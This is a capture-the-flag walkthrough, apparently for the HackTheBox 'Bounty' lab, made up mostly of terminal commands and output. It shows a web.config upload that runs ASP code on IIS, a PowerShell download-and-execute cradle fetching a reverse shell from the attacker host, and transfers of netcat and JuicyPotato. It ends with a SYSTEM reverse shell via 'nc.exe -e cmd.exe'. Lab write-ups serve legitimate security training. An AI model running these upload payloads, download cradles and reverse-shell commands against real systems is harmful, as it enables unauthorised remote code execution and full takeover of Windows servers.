@@ -1,0 +1,394 @@
+RECON
+root@kali:~/htb/bounty# nmap -sC -sV -p- -vv -oA  full 10.10.10.93
+PORT   STATE SERVICE REASON          VERSION
+80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: Bounty
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+WEB ENUM
+root@kali:~/htb/bounty# gobuster -u http://10.10.10.93/ -x "cgi,com,htm,html,log,asp,aspx,jsp,php,pl,txt,conf" -t 40 -s "200,204,301,302,307" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+Gobuster v1.4.1              OJ Reeves (@TheColonial)
+=====================================================
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.10.93/
+[+] Threads      : 40
+[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes : 302,307,200,204,301
+[+] Extensions   : .cgi,.com,.htm,.html,.log,.asp,.aspx,.jsp,.php,.pl,.txt,.conf
+=====================================================
+/transfer.aspx (Status: 200)
+/UploadedFiles (Status: 301)
+/uploadedFiles (Status: 301)
+/uploadedfiles (Status: 301)
+=====================================================
+
+root@kali:~/htb/bounty# gobuster -u http://10.10.10.93/ -x "cgi,com,htm,html,log,asp,aspx,jsp,php,pl,txt,conf" -t 40 -s "200,204,301,302,307" -w /usr/share/wordlists/dirb/big.txt 
+
+Gobuster v1.4.1              OJ Reeves (@TheColonial)
+=====================================================
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.10.93/
+[+] Threads      : 40
+[+] Wordlist     : /usr/share/wordlists/dirb/big.txt
+[+] Status codes : 301,302,307,200,204
+[+] Extensions   : .cgi,.com,.htm,.html,.log,.asp,.aspx,.jsp,.php,.pl,.txt,.conf
+=====================================================
+/aspnet_client (Status: 301)
+/transfer.aspx (Status: 200)
+/uploadedfiles (Status: 301)
+=====================================================
+
+root@kali:~/htb/bounty# dirb http://10.10.10.93
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Thu Nov 26 16:34:56 2020
+URL_BASE: http://10.10.10.93/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.10.93/ ----
+==> DIRECTORY: http://10.10.10.93/aspnet_client/                                                    
+==> DIRECTORY: http://10.10.10.93/uploadedfiles/                                                    
+                                                                                                    
+---- Entering directory: http://10.10.10.93/aspnet_client/ ----
+==> DIRECTORY: http://10.10.10.93/aspnet_client/system_web/                                         
+                                                                                                    
+---- Entering directory: http://10.10.10.93/uploadedfiles/ ----
+                                                                                                    
+---- Entering directory: http://10.10.10.93/aspnet_client/system_web/ ----
+
+UPLOADING FILES WITH EXTENSIONS JPG AND CONFIG WORK
+
+BROWSE TO TRANSFER PAGE AND UPLOAD WEB.CONFIG
+http://10.10.10.93/transfer.aspx
+https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/
+
+BROWSING TO WEB CONFIG RETURNS NUMBER 3 AS SUM ANSWER
+http://10.10.10.93/uploadedfiles/web.config
+3
+
+REPLACE WEB.CONFIG CODE WITH THE FOLLOWING AT THE END
+<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
+ <%
+ Response.write("-"&"->")
+ ' it is running the ASP code if you can see 3 by opening the web.config file!
+ Response.write("<pre>")
+ Set wShell1 = CreateObject("WScript.Shell")
+ Set cmd1 = wShell1.Exec("cmd /c systeminfo")
+ output1 = cmd1.StdOut.Readall()
+ Response.write(output1)
+ Response.write("</pre><!-"&"-")
+ %>
+ -->
+
+REUPLOAD WEB.CONFIG
+http://10.10.10.93/transfer.aspx
+
+BROWSE TO WEB.CONFIG
+http://10.10.10.93/uploadedfiles/web.config
+Host Name:                 BOUNTY
+OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
+OS Version:                6.1.7600 N/A Build 7600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                55041-402-3606965-84760
+Original Install Date:     5/30/2018, 12:22:24 AM
+System Boot Time:          11/26/2020, 6:59:27 PM
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
+Total Physical Memory:     2,047 MB
+Available Physical Memory: 1,632 MB
+Virtual Memory: Max Size:  4,095 MB
+Virtual Memory: Available: 3,656 MB
+Virtual Memory: In Use:    439 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    WORKGROUP
+Logon Server:              N/A
+Hotfix(s):                 N/A
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) PRO/1000 MT Network Connection
+                                 Connection Name: Local Area Connection
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.93
+
+ADD REVERSE SHELL CODE TO WEB.CONFIG
+root@kali:~/htb/bounty# cat web.config
+<?xml version="1.0" encoding="UTF-8"?>
+<configuration>
+       <system.webServer>
+              <handlers accessPolicy="Read, Script, Write">
+                     <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
+              </handlers>
+              <security>
+                     <requestFiltering>
+                            <fileExtensions>
+                                   <remove fileExtension=".config" />
+                            </fileExtensions>
+                            <hiddenSegments>
+                                   <remove segment="web.config" />
+                            </hiddenSegments>
+                     </requestFiltering>
+              </security>
+       </system.webServer>
+</configuration>
+<%
+Set s = CreateObject("WScript.Shell")
+Set cmd = s.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.8/rshell.ps1')")
+o = cmd.StdOut.Readall()
+Response.write(o)
+%>
+
+UPLOAD WEB.CONFIG WITH REVERSE SHELL
+http://10.10.10.93/transfer.aspx
+File uploaded successfully.
+
+TRIGGER REVERSE SHELL
+http://10.10.10.93/uploadedfiles/web.config
+
+GET LOW PRIV REVERSE SHELL
+root@kali:~/htb/bounty# nc -lvp 1234
+listening on [any] 1234 ...
+10.10.10.93: inverse host lookup failed: Unknown host
+connect to [10.10.14.8] from (UNKNOWN) [10.10.10.93] 49158
+Windows PowerShell running as user BOUNTY$ on BOUNTY
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\windows\system32\inetsrv>
+
+PS C:\windows\system32\inetsrv> cd C:\Users
+PS C:\Users> dir
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+d----         5/31/2018  12:18 AM            Administrator                     
+d----         5/30/2018   4:44 AM            Classic .NET AppPool              
+d----         5/30/2018  12:22 AM            merlin                            
+d-r--         5/30/2018   5:44 AM            Public                            
+
+GET USER FLAG
+PS C:\Users> type merlin\Desktop\user.txt
+######################################
+PS C:\Users> 
+
+CHECK INSTALLED UPDATES
+PS C:\Users> systeminfo
+
+Host Name:                 BOUNTY
+OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
+OS Version:                6.1.7600 N/A Build 7600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                55041-402-3606965-84760
+Original Install Date:     5/30/2018, 12:22:24 AM
+System Boot Time:          11/27/2020, 3:55:10 AM
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
+Total Physical Memory:     2,047 MB
+Available Physical Memory: 1,562 MB
+Virtual Memory: Max Size:  4,095 MB
+Virtual Memory: Available: 3,564 MB
+Virtual Memory: In Use:    531 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    WORKGROUP
+Logon Server:              N/A
+Hotfix(s):                 N/A
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) PRO/1000 MT Network Connection
+                                 Connection Name: Local Area Connection
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.93
+
+PRIVESC
+
+CHECK USER PRIVILEGES
+PS C:\Users> net users
+
+User accounts for \\BOUNTY
+
+-------------------------------------------------------------------------------
+Administrator            Guest                    merlin                   
+The command completed successfully.
+
+PS C:\Users> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+CHECK POTENTIAL EXPLOITS WITH WINDOWS EXPLOIT SUGGESTER
+root@kali:~/htb/bounty# python /root/Windows-Exploit-Suggester/windows-exploit-suggester.py --database /root/Windows-Exploit-Suggester/2020-11-20-mssb.xls --systeminfo /root/htb/bounty/sysinfo.txt 
+[*] initiating winsploit version 3.3...
+[*] database file detected as xls or xlsx based on extension
+[*] attempting to read from the systeminfo input file
+[+] systeminfo input file read successfully (ascii)
+[*] querying database file for potential vulnerabilities
+[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
+[*] there are now 197 remaining vulns
+[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
+[+] windows version identified as 'Windows 2008 R2 64-bit'
+[*] 
+[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
+[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
+[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
+[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
+[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
+[*] 
+[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
+[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
+[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
+[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
+[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
+[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
+[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
+[*] done
+
+TRANSFER MS11-011
+PS C:\Users> cd Public
+PS C:\Users\Public> (New-Object System.Net.WebClient).DownloadFile("http://10.10.14.8/MS11-011.exe", "c:\users\Public\MS11-011.exe")
+PS C:\Users\Public> dir
+
+
+    Directory: C:\Users\Public
+
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+d-r--         7/14/2009   8:06 AM            Documents                         
+d-r--         7/14/2009   7:57 AM            Downloads                         
+d-r--         7/14/2009   7:57 AM            Music                             
+d-r--         7/14/2009   7:57 AM            Pictures                          
+d-r--         7/14/2009   7:57 AM            Videos                            
+-a---        11/27/2020   4:21 AM      96861 MS11-011.exe                      
+
+AS SEIMPERSONATE PRIVILEGE AVAILABLE TRANSFER JUICYPOTATO 
+root@kali:~/htb/bounty# wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
+
+START IMPACKET SMB SERVER TO TRANSFER JUICY POTATO
+root@kali:~/htb/bounty# impacket-smbserver share /root/htb/bounty/
+Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+
+TRANSFER OVER NETCAT AND JUICYPOTATO
+PS C:\Users\Public> net use Z: \\10.10.14.8\share
+PS C:\Users\Public> copy \\10.10.14.8\share\nc.exe .
+PS C:\Users\Public> copy \\10.10.14.8\share\JuicyPotato.exe .
+PS C:\Users\Public> dir
+
+
+    Directory: C:\Users\Public
+
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+d-r--         7/14/2009   8:06 AM            Documents                         
+d-r--         7/14/2009   7:57 AM            Downloads                         
+d-r--         7/14/2009   7:57 AM            Music                             
+d-r--         7/14/2009   7:57 AM            Pictures                          
+d-r--         7/14/2009   7:57 AM            Videos                            
+-a---         8/10/2018  12:55 PM     347648 JuicyPotato.exe                   
+-a---        11/27/2020   4:21 AM      96861 MS11-011.exe                      
+-a---        11/26/2020  11:49 PM      59392 nc.exe 
+
+RUN JUICYPOTATO TO LAUNCH NETCAT REVERSE LISTENER AS SYSTEM USER
+PS C:\Users\Public> .\JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe -a "/c c:\Users\Public\nc.exe -e cmd.exe 10.10.14.8 53" -t *
+Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
+....
+[+] authresult 0
+{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
+
+[+] CreateProcessWithTokenW OK
+
+GET ROOT SHELL 
+root@kali:~/htb/bounty# nc -lvp 53
+listening on [any] 53 ...
+10.10.10.93: inverse host lookup failed: Unknown host
+connect to [10.10.14.8] from (UNKNOWN) [10.10.10.93] 49169
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>cd C:\Users\Administrator\Desktop
+cd C:\Users\Administrator\Desktop
+
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 5084-30B0
+
+ Directory of C:\Users\Administrator\Desktop
+
+05/30/2018  11:18 PM    <DIR>          .
+05/30/2018  11:18 PM    <DIR>          ..
+05/30/2018  11:18 PM                32 root.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  11,884,072,960 bytes free
+
+GET ROOT FLAG
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+##########################
+
+
